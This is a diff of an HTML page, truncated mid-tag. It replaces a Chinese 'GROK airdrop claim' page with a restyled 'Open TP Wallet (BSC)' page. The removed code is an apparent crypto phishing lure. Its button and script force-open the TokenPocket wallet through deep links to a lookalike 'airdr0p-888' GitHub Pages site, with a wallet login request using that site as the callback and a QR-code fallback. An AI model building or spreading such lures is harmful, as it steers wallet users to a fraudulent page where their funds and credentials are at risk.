@@ -1,77 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GROK 空投领取</title>
+  <title>打开 TP 钱包（BSC）</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      overflow: hidden;
+    }
+    .container {
+      text-align: center;
+      padding: 2rem;
+      max-width: 90%;
+    }
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+      text-shadow: 0 2px 4px rgba(0,0,0,.3);
+    }
+    p {
+      font-size: 1rem;
+      margin-bottom: 2rem;
+      opacity: .9;
+    }
+    .btn {
+      display: inline-block;
+      padding: 0.9rem 2.2rem;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(45deg, #f0b90b, #f9d423);
+      border: none;
+      border-radius: 50px;
+      box-shadow: 0 6px 15px rgba(240,185,11,.4);
+      text-decoration: none;
+      transition: all .3s ease;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 20px rgba(240,185,11,.5);
+    }
+    .btn:active {
+      transform: translateY(-1px);
+    }
+    .btn::after {
+      content: "";
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 5px; height: 5px;
+      background: rgba(255,255,255,.5);
+      opacity: 0;
+      border-radius: 100%;
+      transform: scale(1) translate(-50%, -50%);
+      transition: all .6s;
+    }
+    .btn:active::after {
+      width: 200px; height: 200px;
+      opacity: 1;
+      transition: 0s;
+    }
+    .qrcode {
+      margin-top: 2rem;
+      display: none;
+    }
+    .qrcode img {
+      width: 180px;
+      border: 8px solid #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,.2);
+    }
+    .tip {
+      margin-top: 1rem;
+      font-size: .9rem;
+      opacity: .8;
+    }
+  </style>
 </head>
 <body>
 
-<h2>GROK 空投领取</h2>
-
-<!-- 主按钮：tpdapp 打开网页（BSC） -->
-<a href='tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%2C%22chain%22%3A%22BSC%22%2C%22source%22%3A%22web%22%7D' 
-   style="display: inline-block; padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
-  GROK 空投领取
-</a>
-
-<br/>
-
-
-
-<div id="qrcode" style="margin-top:20px; display:none; text-align:center;">
-  <p>如果失败，用 TP 钱包扫码打开：</p>
-  <img id="qrcode-img" src="" alt="二维码" style="width:200px; border:1px solid #ccc;">
-</div>
-
-<script>
-const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";
-
-function isTPBrowser() {
-  const ua = navigator.userAgent.toLowerCase();
-  return ua.indexOf('tokenpocket') !== -1 || ua.indexOf('tpdapp') !== -1;
-}
-
-function showQRCode(url) {
-  const qr = document.getElementById('qrcode');
-  const img = document.getElementById('qrcode-img');
-  if (!qr || !img) return;
-  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
-  qr.style.display = 'block';
-}
-
-function openTPWithFallback() {
-  if (isTPBrowser()) {
-    location.href = TARGET_URL;
-    return;
-  }
-
-  // 方案1: tpdapp 打开网页（BSC）
-  const params1 = { url: TARGET_URL, chain: "BSC", source: "web" };
-  const encodedParams1 = encodeURIComponent(JSON.stringify(params1));
-  const scheme1 = `tpdapp://open?params=${encodedParams1}`;
-  window.location.href = scheme1;
-
-  // 方案2: 300ms 后 tpoutside 授权 + BSC 回调
-  setTimeout(() => {
-    const params2 = {
-      action: "login",
-      actionId: Date.now().toString(),
-      blockchains: [{ chainId: "56", network: "bsc" }],
-      dappName: "MyDApp",
-      protocol: "TokenPocket",
-      version: "2.0",
-      callbackUrl: TARGET_URL
-    };
-    const encodedParams2 = encodeURIComponent(JSON.stringify(params2));
-    const scheme2 = `tpoutside://pull.activity?param=${encodedParams2}`;
-    window.location.href = scheme2;
-  }, 300);
-
-  // 兜底: 3.5s 后显示二维码
-  setTimeout(() => showQRCode(TARGET_URL), 3500);
-}
-</script>
-
-</body>
-</html>
+<div class
